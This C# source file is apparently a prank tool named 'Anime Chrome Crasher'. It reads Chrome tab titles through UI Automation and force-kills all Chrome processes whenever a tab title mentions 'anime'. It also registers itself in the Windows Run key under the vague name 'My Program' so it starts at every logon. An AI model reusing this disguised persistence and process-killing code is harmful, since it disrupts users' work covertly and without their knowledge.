using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Windows.Automation;
using System.Text.RegularExpressions;
using Microsoft.Win32;

namespace Anime_Chrome_Crasher
{
    public class FindWindows
    {
        public static Process[] GetProcesses()
        {
            Process[] Processes = Process.GetProcesses();
            return Processes;
        }

        public static bool GetChrome()
        {
            Process[] getchrome = Process.GetProcessesByName("chrome");
            return (getchrome.Length <= 0) ? false : true;
        }

        public static bool CheckTabs()
        {
            Process[] Chrome = Process.GetProcessesByName("chrome");
            foreach (Process proc in Chrome)
            {
                if (proc.MainWindowHandle == IntPtr.Zero)
                {
                    continue;
                }
                AutomationElement root = AutomationElement.FromHandle(proc.MainWindowHandle);
                Condition condNewTab = new PropertyCondition(AutomationElement.NameProperty, "New Tab");
                AutomationElement elmNewTab = root.FindFirst(TreeScope.Descendants, condNewTab);
                TreeWalker treewalker = TreeWalker.ControlViewWalker;
                try
                {
                    AutomationElement elmTabStrip = treewalker.GetParent(elmNewTab);
                    Condition condTabItem = new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.TabItem);
                    Regex rx = new Regex("[aA]nime");
                    foreach (AutomationElement tabitem in elmTabStrip.FindAll(TreeScope.Children, condTabItem))
                    {
                        if (rx.IsMatch(tabitem.Current.Name))
                        {
                            killWindow("chrome");
                            return true;
                        }
                    }
                }
                catch (ArgumentNullException)
                {
                    return false;
                }
            }
            return false;
        }

        public static void Start()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue("My Program", "\"" + Application.ExecutablePath + "\"");
            }
        }

        public static void killWindow(string windowname)
        {
            foreach (var process in Process.GetProcessesByName(windowname))
            {
                try
                {
                    try
                    {
                        process.Kill();
                    }
                    catch (InvalidOperationException)
                    {

                    }
                }
                catch (System.ComponentModel.Win32Exception)
                {

                }
            }
        }
    }

}